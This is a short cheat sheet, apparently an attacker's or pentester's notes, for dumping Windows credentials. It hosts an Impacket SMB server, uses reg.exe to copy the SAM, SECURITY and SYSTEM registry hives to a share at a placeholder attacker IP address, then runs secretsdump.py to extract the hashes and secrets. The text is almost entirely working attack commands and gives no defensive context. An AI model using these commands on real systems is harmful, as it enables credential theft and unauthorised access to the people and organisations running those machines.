# dumping Windows credentials

## 0. start an SMB server

```
$ cd /path/to/loot/hklm/
$ sudo smbserver.py hklm ./ -smb2support
...
```

## 1. download `SAM`, `SECURITY` and `SYSTEM` hives

```
> reg.exe save hklm\sam \\<attacker IP address>\hklm\sam
> reg.exe save hklm\security \\<attacker IP address>\hklm\security
> reg.exe save hklm\system \\<attacker IP address>\hklm\system
```

## 2. dump the secrets

```
$ cd /path/to/loot/hklm/
$ secretsdump.py -sam sam -security security -system system LOCAL
...
```
